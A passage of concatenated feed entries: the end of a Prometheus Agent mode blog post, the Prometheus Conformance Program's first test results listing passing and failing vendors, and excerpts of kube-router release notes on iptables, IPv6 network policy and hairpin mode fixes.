feature names to enable. Valid options: agent, exemplar-storage, expand-external-labels, memory-snapshot-on-shutdown, promql-at-modifier, promql-negative-offset, remote-write-receiver,\n                                 extra-scrape-metrics, new-service-discovery-manager. See https://prometheus.io/docs/prometheus/latest/feature_flags/ for more details.\n</code></pre>\n<p>Since the Agent mode is behind a feature flag, as mentioned previously, use the <code>--enable-feature=agent</code> flag to run Prometheus in the Agent mode. Now, the rest of the flags are either for both server and Agent or only for a specific mode. You can see which flag is for which mode by checking the last sentence of a flag's help string. \"Use with server mode only\" means it's only for server mode. If you don't see any mention like this, it means the flag is shared.</p>\n<p>The Agent mode accepts the same scrape configuration with the same discovery options and remote write options.</p>\n<p>It also exposes a web UI with disabled query capabitilies, but showing build info, configuration, targets and service discovery information as in a normal Prometheus server.</p>\n<h3>Hands-on Prometheus Agent Example: Katacoda Tutorial</h3>\n<p>Similarly to Prometheus remote-write tutorial, if you would like to try the hands-on experience of Prometheus Agent capabilities, we recommend the <a href=\"https://katacoda.com/thanos/courses/thanos/4-receiver-agent\">Thanos Katacoda tutorial of Prometheus Agent</a>, which explains how easy it is to run Prometheus Agent.</p>\n<h2>Summary</h2>\n<p>I hope you found this interesting!

      "summary": "<p>Today, we're launching the <a href=\"https://prometheus.io/blog/2021/05/03/introducing-prometheus-conformance-program/\">Prometheus Conformance Program</a> with the goal of ensuring interoperability between different projects and vendors in the Prometheus monitoring space. While the legal paperwork still needs to be finalized, we ran tests, and we consider the below our first round of results. As part of this launch <a href=\"https://promlabs.com/blog/2021/10/14/promql-vendor-compatibility-round-three\">Julius Volz updated his PromQL test results</a>.</p>\n<p>As a quick reminder: The program is called Prometheus <strong>Conformance</strong>, software can be <strong>compliant</strong> to specific tests, which result in a <strong>compatibility</strong> rating. The nomenclature might seem complex, but it allows us to speak about this topic without using endless word snakes.</p>\n<h1>Preamble</h1>\n<h2>New Categories</h2>\n<p>We found that it's quite hard to reason about what needs to be applied to what software. To help sort my thoughts, we created <a href=\"https://docs.google.com/document/d/1VGMme9RgpclqF4CF2woNmgFqq0J7nqHn-l72uNmAxhA\">an overview</a>, introducing four new categories we can put software into:</p>\n<ul>\n<li>Metrics Exposers</li>\n<li>Agents/Collectors</li>\n<li>Prometheus Storage Backends</li>\n<li>Full Prometheus Compatibility</li>\n</ul>\n<h2>Call for Action</h2>\n<p>Feedback is very much welcome. Maybe counter-intuitively, we want the community, not just Prometheus-team, to shape this effort. To help with that, we will launch a WG Conformance within Prometheus. As with <a href=\"https://docs.google.com/document/d/1k7_Ya7j5HrIgxXghTCj-26CuwPyGdAbHS0uQf0Ir2tw\">WG Docs</a> and <a href=\"https://docs.google.com/document/d/1HWL-NIfog3_pFxUny0kAHeoxd0grnqhCBcHVPZN4y3Y\">WG Storage</a>, those will be public and we actively invite participation.</p>\n<p>As we <a href=\"https://www.youtube.com/watch?v=CBDZKjgRiew\">alluded to recently</a>, the maintainer/adoption ratio of Prometheus is surprisingly, or shockingly, low. In different words, we hope that the economic incentives around Prometheus Compatibility will entice vendors to assign resources in building out the tests with us. If you always wanted to contribute to Prometheus during work time, this might be the way; and a way that will have you touch a lot of highly relevant aspects of Prometheus. There's a variety of ways to <a href=\"https://prometheus.io/community/\">get in touch</a> with us.</p>\n<h2>Register for being tested</h2>\n<p>You can use the <a href=\"https://prometheus.io/community/\">same communication channels</a> to get in touch with us if you want to register for being tested. Once the paperwork is in place, we will hand contact information and contract operations over to CNCF.</p>\n<h1>Test results</h1>\n<h2>Full Prometheus Compatibility</h2>\n<p>We know what tests we want to build out, but we are not there yet. As announced previously, it would be unfair to hold this against projects or vendors. As such, test shims are defined as being passed. The currently semi-manual nature of e.g. the <a href=\"https://promlabs.com/blog/2021/10/14/promql-vendor-compatibility-round-three\">PromQL tests Julius ran this week</a> mean that Julius tested sending data through Prometheus Remote Write in most cases as part of PromQL testing. We're reusing his results in more than one way here. This will be untangled soon, and more tests from different angles will keep ratcheting up the requirements and thus End User confidence.</p>\n<p>It makes sense to look at projects and aaS offerings in two sets.</p>\n<h3>Projects</h3>\n<h4>Passing</h4>\n<ul>\n<li>Cortex 1.10.0</li>\n<li>M3 1.3.0</li>\n<li>Promscale 0.6.2</li>\n<li>Thanos 0.23.1</li>\n</ul>\n<h4>Not passing</h4>\n<p>VictoriaMetrics 1.67.0 is not passing and <a href=\"https://promlabs.com/blog/2021/10/14/promql-vendor-compatibility-round-three#victoriametrics\">does not intend to pass</a>. In the spirit of End User confidence, we decided to track their results while they position themselves as a drop-in replacement for Prometheus.</p>\n<h3>aaS</h3>\n<h4>Passing</h4>\n<ul>\n<li>Chronosphere</li>\n<li>Grafana Cloud</li>\n</ul>\n<h4>Not passing</h4>\n<ul>\n<li>Amazon Managed Service for Prometheus</li>\n<li>Google Cloud Managed Service for Prometheus</li>\n<li>New Relic</li>\n<li>Sysdig Monitor</li>\n</ul>\n<p>NB: As Amazon Managed Service for Prometheus is based on Cortex just like Grafana Cloud, we expect them to pass after the next update cycle.</p>\n<h2>Agent/Collector</h2>\n<h3>Passing</h3>\n<ul>\n<li>Grafana Agent 0.19.0</li>\n<li>OpenTelemetry Collector 0.37.0</li>\n<li>Prometheus 2.30.3</li>\n</ul>\n<h3>Not passing</h3>\n<ul>\n<li>Telegraf 1.20.2</li>\n<li>Timber Vector 0.16.1</li>\n<li>VictoriaMetrics Agent 1.67.0</li>\n</ul>\n<p>NB: We tested Vector 0.16.1 instead of 0.17.0 because there are no binary downloads for 0.17.0 and our test toolchain currently expects binaries.</p>",

Containerd functionality is unchanged in that it uses the value for the IP addresses specifically</p>\n</blockquote>\n<blockquote>\n<p>It's worth noting that CNI ADD success results which do not contain any interfaces will be discarded in this determination of the default, therefore it's recommended to set one with an associated gateway if aiming to have it be noted as the default.</p>\n</blockquote>\n<p>See also:<br />\n<a href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5\">https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5</a> <a class=\"issue-link js-issue-link\" href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/pull/73\">k8snetworkplumbingwg/network-attachment-definition-client#73</a></p>",

      "summary": "<h2>Summary</h2>\n<p>This update is mainly a dependency and docker image base update. For a long time, kube-router has been stalled on Alpine 3.18 because of a breaking change with the upstream iptables user space. However, this was fixed in <code>iptables-1.8.11</code> which was released in November and then was integrated into Alpine 3.21 early this Month. See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1789\">#1789</a> for more information.</p>\n<p>This should make kube-router much more tolerant of iptables / nftables rules added by recent versions of the netfilter userspaces.</p>\n<p>This release does contain a few prominent fixes since the last release of v2.4.1:</p>\n<ul>\n<li><code>ipset.Save()</code> was introduced at the start of the NetworkPolicyController resolving a race condition between the NetworkPolicyController (<code>--run-firewall</code>) and the NetworkServiceController (<code>--run-service-proxy</code>). See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/pull/1806\">#1806</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/alexcriss\">@alexcriss</a> for reporting this and being patient while we tried to reproduce)</li>\n<li>Internal cluster traffic is now properly excluded from NAT conditions which resolves a regression that was introduced in the v2.3 release line. See: <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1778\">#1778</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/zerkms\">@zerkms</a> for reporting this)</li>\n</ul>\n<p>Other major dependency updates:</p>\n<ul>\n<li>Bundled CNI plugins have been updated from v1.4.0 -&gt; v1.6.2</li>\n<li>Go version has been updated from v1.22.3 -&gt; v1.23.6</li>\n</ul>\n<h2>Contributions</h2>\n<p>Special thanks to <a class=\"user-mention notranslate\" href=\"https://github.com/rbrtbnfgl\">@rbrtbnfgl</a> and <a class=\"user-mention notranslate\" href=\"https://github.com/dsseng\">@dsseng</a> for their contributions to this release!</p>\n<h2>Changelog</h2>\n<ul>\n<li><a class=\"commit-link\" href=\"https://github.com/cloudnativelabs/kube-router/commit/85e429e9c72b2bc7de93b5f1bcce20e7c924386d\"><tt>85e429e</tt></a> -

There are now tests to ensure that this type of regression doesn't happen again.</li>\n<li>Fixes IPv6 network policy which has been substantially broken since v2.0.0. When IPv6 network policy was introduced, it was missed that iptables statements need to reference these sets via the <code>inet6</code> prefix in order to use them correctly. As such, most network policies were not correctly applying.</li>\n<li>kube-router no longer activates the hairpin controller which was introduced in v2.1.0, instead relying on user's correctly configuring their CNI with <code>hairpinMode: true</code> (see <a href=\"https://www.kube-router.io/docs/user-guide/#hairpin-mode\" rel=\"nofollow\">https://www.kube-router.io/docs/user-guide/#hairpin-mode</a> for more details)</li>\n<li>Adds fallback logic for referencing <code>rt_tables</code>, the path of which changed in versions of iproute2 v6.5.0 and above. Users that have newer systems, enable DSR, and run kube-router within a container should check to ensure this file is mounted correctly within the kube-router container.</li>\n<li>kube-router no longer tries and fails to enter pods to setup DSR for pods that are not scheduled on it's node</li>\n<li>kube-router no longer tries and fails to setup DSR for pods that are part of the host's network</li>\n<li>Fixes <code>--cleanup-config</code> mode which has been broken since v2.0.0 (please see docs for updated examples of how to run this from within a container)</li>\n</ul>\n<h3>Special Note for Users that Run Hairpin Mode Enabled Services</h3>\n<p>If you use hairpin mode either as a service annotation or a CLI parameter to kube-router, we recommend that you check your CNI configuration file to ensure that you are setting <code>\"hairpinMode\":true</code> on the <code>bridge</code> CNI plugin. This is the only way that hairpin mode will work correctly as the previous hairpin controller built into kube-router has now been disabled as it was a tricky implementation and had significant problems with irregular containers.</p>\n<p>If you find that you need to add this to your CNI config file, please ensure that kubelet has been restarted, and that any pods that rely on hairpinning have been restarted as well.</p>\n<p>See <a href=\"https://www.kube-router.io/docs/user-guide/#hairpin-mode\" rel=\"nofollow\">https://www.kube-router.io/docs/user-guide/#hairpin-mode</a> for more information.</p>\n<h2>Contributions</h2>\n<p>A big thanks <a class=\"user-mention notranslate\" href=\"https://github.com/elchenberg\">@elchenberg</a> &amp; <a class=\"user-mention notranslate\" href=\"https://github.com/xujunjie-cover\">@xujunjie-cover</a> for contributing fixes for this release!</p>\n<h2>Changelog</h2>\n<ul>\n<li><a class=\"commit-link\" href=\"https://github.com/cloudnativelabs/kube-router/commit/e42792f4e2e2a9b3884e0dd0a54b8670ec42ab0f\"><tt>e42792f</tt></a> -
